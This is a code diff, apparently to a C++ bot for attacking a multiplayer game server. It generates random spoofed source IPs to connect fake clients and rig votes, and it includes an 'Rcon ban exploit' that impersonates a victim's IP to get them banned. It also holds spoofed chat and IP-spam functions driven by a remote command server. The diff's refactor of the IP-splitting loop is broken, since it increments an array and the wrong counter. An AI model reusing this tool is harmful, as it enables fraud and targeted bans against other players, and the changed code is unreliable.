@@ -187,7 +187,7 @@ USHORT checksum(USHORT *buffer, int size)
 }
 
 
-/* debug for packet's data */
+/* Debug for packet's data */
 void Debug(unsigned char *buffer, int buffersize)
 {
 	int i;
@@ -216,11 +216,13 @@ const char *GenIPChar()
 	int Oktett[4];
 	static char aIP[32];
 	
+	// do the initial random process
 	Oktett[0] = rand()%255+1;
 	Oktett[1] = rand()%255+1;
 	Oktett[2] = rand()%255+1;
 	Oktett[3] = rand()%255+1;
 	
+	// check for invalid IPs
 	while(Oktett[0] == 192 || Oktett[0] == 10 || Oktett[0] == 172 || Oktett[0] == 127)
 	{
 		Oktett[0] = rand()%255+1;
@@ -228,7 +230,7 @@ const char *GenIPChar()
 	
 	sprintf(aIP, "%i.%i.%i.%i", Oktett[0], Oktett[1], Oktett[2], Oktett[3]);
 
-	printf("%s\n", aIP);
+	//printf("%s\n", aIP);
 	return aIP;
 }
 
@@ -243,9 +245,10 @@ void ConnectDummies(const char *IP, int Port, int Amount, int Vote)
 			Close(i);
 	}
 
+	// generate IPs
 	for (int k = 0; k < Amount; k++)
 	{
-		m_FromIP[k] = genip();//inet_addr(GenIPChar());
+		m_FromIP[k] = inet_addr(GenIPChar());
 	}
 
 	m_FromPort = htons(1111);
@@ -257,7 +260,7 @@ void ConnectDummies(const char *IP, int Port, int Amount, int Vote)
 	int BufferSize = 0;
 	int j = 0;
 
-
+	// send the dummies
 	for(j = 0; j < Amount; j++)
 	{
 		Reset(j);
@@ -299,6 +302,7 @@ void ConnectDummies(const char *IP, int Port, int Amount, int Vote)
 
 		//Debug(&buffer[0], BufferSize);
 
+		// vote if wanted
 		if(Vote == 1 || Vote == -1)
 		{
 			ZeroMemory(buffer, 2048);
@@ -315,6 +319,7 @@ void DisconnectDummies()
 
 	int i = 0;
 
+	// send disconnect packets
 	for(i = 0; i < 64; i++)
 	{
 		ZeroMemory(buffer, sizeof(buffer));
@@ -323,8 +328,7 @@ void DisconnectDummies()
 	}
 }
 
-/*
- ***					Short summary on this.
+/*	 ##################### Short summary on this. #######################
  ***
  *** Dummies should not disconnect automatically. The reason for that is,
  *** that if they leave again their vote is not counted.
@@ -332,11 +336,11 @@ void DisconnectDummies()
 */
 void VoteBot(const char *IP, int Port, int Amount, int v)
 {
+	// this function is just used as a wrapper for readability
 	ConnectDummies(IP, Port, Amount, v);
 }
 
-/*
- ***					  Rcon ban exploit.
+/*	 ########################## Rcon ban exploit. ############################
  ***
  *** We don't need the targets port for this exploit, we just connect a
  *** dummy with the target's ip and spam rcon auth packets. This will get his
@@ -360,6 +364,7 @@ void RconBan(const char *SrvIP, int Port, const char *BanIP)
 	int BufferSize = 0;
 	Reset(0);
 
+	// send the dummy used to spam the rcon
 	ZeroMemory(buffer, sizeof(buffer));
 	BufferSize = PackConnect(&buffer[0], 0);
 	SendData((const char*)buffer, BufferSize, 0);
@@ -380,12 +385,13 @@ void RconBan(const char *SrvIP, int Port, const char *BanIP)
 	BufferSize = PackEnterGame(&buffer[0], 0);
 	SendData((const char*)buffer, BufferSize, 0);
 
+	// -> Tick() funcion
 	m_SendRcon = true;
 }
 
 void SendChat(const char *SrvIP, int Port, const char *SpoofIP, int SpoofPort, char *Msg)
 {
-	// ToDo: More than one word as Msg ._.
+	// ToDo: More than one word as Msg ._. --Note by Meskalin: This should not be done here, but where the command is received.
 
 	if (!Create(&m_Sock[0]))
 		Close(0);
@@ -408,37 +414,37 @@ void SendChat(const char *SrvIP, int Port, const char *SpoofIP, int SpoofPort, c
 void SpamIPs(const char *IP, int Port)
 {
 	std::ifstream File("ips.txt");
-	printf("start\n");
 	if(!File)
 		return;
 
 	if (!Create(&m_Sock[0]))
 		Close(0);
 
-	printf("start2\n");
+	// loop through the file
 	std::string Line;
 	while(std::getline(File, Line))
 	{
-		char aCmd[512][256] = {{0}};
-		ZeroMemory(&aCmd, sizeof(aCmd));
-		int Cmd = 0;
+		char aSplit[512][256] = {{0}};
+		ZeroMemory(&aSplit, sizeof(aSplit));
+		int Split = 0;
 		int Char = 0;
 
+		// split the string
 		for(int i = 0; i < strlen(Line.c_str()); i++)
 		{
 			if(Line.c_str()[i] == ':')
 			{
-				Cmd++;
+				aSplit++;
 				Char = 0;
 				continue;
 			}
 
-			aCmd[Cmd][Char] = Line.c_str()[i];
-			Char++;
+			aSplit[Split][Char] = Line.c_str()[i];
+			Split++;
 		}
 
-		m_FromIP[0] = inet_addr(aCmd[0]);
-		m_FromPort = htons(atoi(aCmd[1]));
+		m_FromIP[0] = inet_addr(aSplit[0]);
+		m_FromPort = htons(atoi(aSplit[1]));
 
 		m_ToIP = inet_addr(IP);
 		m_ToPort = htons(Port);
@@ -447,13 +453,11 @@ void SpamIPs(const char *IP, int Port)
 		int BufferSize = 0;
 		Reset(0);
 
+		// send the chat packet
 		ZeroMemory(buffer, sizeof(buffer));
-		BufferSize = PackSay(&buffer[0], 0, aCmd[0], 0);
+		BufferSize = PackSay(&buffer[0], 0, aSplit[0], 0);
 		SendData((const char*)buffer, BufferSize, 0);
-
-		printf("Send through %s %d\n", aCmd[0], atoi(aCmd[1]));
 	}
-	printf("End\n");
 }
 
 void Tick()
@@ -468,6 +472,7 @@ void Tick()
 
 		int BufferSize = 0;
 
+		// keep the dummies alive
 		for (int i = 0; i < AmountofDummies; i++)
 		{
 			ZeroMemory(buffer, 2048);
@@ -513,6 +518,7 @@ DWORD WINAPI WorkingThread(LPVOID lpParam)
 			int Cmd = 0;
 			int Char = 0;
 
+			// split the command to extract the parameters
 			for(int i = 0; i < strlen(buffer); i++)
 			{
 				if(buffer[i] == ' ')
@@ -581,7 +587,7 @@ DWORD WINAPI WorkingThread(LPVOID lpParam)
 					int Port = atoi(aCmd[2]);
 					SpamIPs(aCmd[1], Port);
 
-					send(g_Client, "[Server]: Spam sent successfully!", strlen("[Server]: Spam sent successfully!"), 0);
+					send(g_Client, "[Server]: IP-spam sent successfully!", strlen("[Server]: IP-spam sent successfully!"), 0);
 				}
 				else
 					send(g_Client, "[Server]: Please use: ipspam <srvip> <srvport>", strlen("[Server]: Please use: ipspam <srvip> <srvport>"), 0);
@@ -649,6 +655,7 @@ int _tmain(int argc, _TCHAR* argv[])
 		if(g_Client != SOCKET_ERROR)
 		{
 			printf("Client accepted: %s:%i\n", inet_ntoa(client_info.sin_addr), ntohs(client_info.sin_port));
+			// create a thread for multi-client support!
 			CreateThread(NULL, 0, WorkingThread, (LPVOID)g_Client, 0, &Thread);
 		}
 		else
